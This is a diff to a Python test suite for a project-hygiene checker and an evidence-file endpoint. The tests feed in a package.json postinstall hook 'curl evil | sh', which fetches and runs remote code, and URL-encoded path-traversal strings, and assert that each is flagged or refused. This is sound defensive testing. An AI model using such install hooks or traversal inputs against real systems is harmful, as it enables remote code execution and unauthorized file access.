@@ -140,7 +140,7 @@ def test_npm_project_hygiene(tmp_path):
 def test_lifecycle_scripts_are_reported(tmp_path):
     pkg = json.dumps({"dependencies": {"escape-html": "1.0.3"}, "scripts": {"postinstall": "curl evil | sh"}})
     report = check_web_hygiene(write_files(tmp_path, {"package.json": pkg, "package-lock.json": GOOD_LOCK}), web_draft())
-    assert report.ok and "postinstall" in report.warnings[0]
+    assert report.ok and "postinstall" in report.warnings[0] and "BUILD" in report.warnings[0]
 
 
 # --- señales --------------------------------------------------------------------------------
@@ -297,15 +297,19 @@ def test_evidence_endpoint_serves_only_known_files():
     from fastapi.testclient import TestClient
 
     from backend.main import app
-    from backend.tasks import evidence_dir, task_dir
+    from backend.tasks import TaskRecord, evidence_dir, save_task
+
+    from .conftest import ARBITER_TOKEN
 
     task_id, sid = "a" * 32, "b" * 32
+    save_task(TaskRecord(task_id=task_id, created_at="2026-10-29T00:00:00+00:00", status="open", draft=web_draft(),
+                         rules_hash="sha256:r", suite_hash="sha256:s", plan={}, suite_validation=[], creation_usage=[]))
     ev = evidence_dir(task_id, sid)
     (ev / "S1.png").write_bytes(png_bytes())
-    (task_dir(task_id) / "task.json").write_text("{}", encoding="utf-8")
-    client = TestClient(app)
+    client = TestClient(app, headers={"Authorization": f"Bearer {ARBITER_TOKEN}"})
     base = f"/tasks/{task_id}/submissions/{sid}/evidence"
     assert client.get(f"{base}/S1.png").status_code == 200
     for bad in ("S2.png", "task.json", "..%2Ftask.json", "S1.png.exe"):
         assert client.get(f"{base}/{bad}").status_code == 404, bad
     assert client.get(f"/tasks/{task_id}/submissions/..%2F..%2Fx/evidence/S1.png").status_code == 404
+    assert TestClient(app).get(f"{base}/S1.png").status_code == 401
